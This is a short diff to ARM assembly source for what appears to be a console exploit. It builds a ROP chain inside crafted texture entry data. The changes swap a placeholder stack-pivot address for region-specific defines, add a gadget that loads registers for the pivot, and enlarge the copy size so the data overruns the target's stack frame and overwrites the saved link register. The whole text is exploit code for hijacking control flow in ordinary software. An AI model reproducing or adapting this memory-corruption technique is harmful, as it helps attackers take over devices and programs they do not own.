@@ -8,12 +8,22 @@ _start:
 
 #include "ropkit_ropinclude.s"
 
-#ifndef STACKPIVOT_ADR
-#define STACKPIVOT_ADR 0xa0a0a0a0//Tmp value until stackpivot for non-USA is supported.
+#ifdef STACKPIVOT_ADR0
+	#define STACKPIVOT_ADR STACKPIVOT_ADR0
+#else
+	#ifdef STACKPIVOT_ADR1
+		#define STACKPIVOT_ADR STACKPIVOT_ADR1
+	#else
+		#error STACKPIVOT_ADR* not defined.
+	#endif
 #endif
 
+#define STACKPIVOT_PREPAREREGS_SIZE 0x10
+#define STACKPIVOT_JUMP_SIZE 0x4
+
 .macro ROPMACRO_STACKPIVOT_PREPAREREGS_BEFOREJUMP
-.word POP_R5R6PC
+.word POP_R4R5R6PC
+.word ROPBUFLOC(pivotdata+0x34) @ r4
 .word 0 @ r5
 .word ROPBUFLOC(pivotdata+0x34) @ r6
 .endm
@@ -29,7 +39,7 @@ _start:
 
 .space ((_start + 0x20) - .) @ Entry for the first texture, 0x20-bytes per entry.
 .word 0, 0, 0, 0, 0
-.word (TARGET_STACKFRAME_BEFORELROVERWRITE_SIZE+0x10)>>2 @ u8size, total size to copy in words.
+.word (TARGET_STACKFRAME_BEFORELROVERWRITE_SIZE+(STACKPIVOT_PREPAREREGS_SIZE+STACKPIVOT_JUMP_SIZE))>>2 @ u8size, total size to copy in words.
 .word 0x40>>2 @ Absolute offset for the srcdataptr, in words.
 .word 0
 
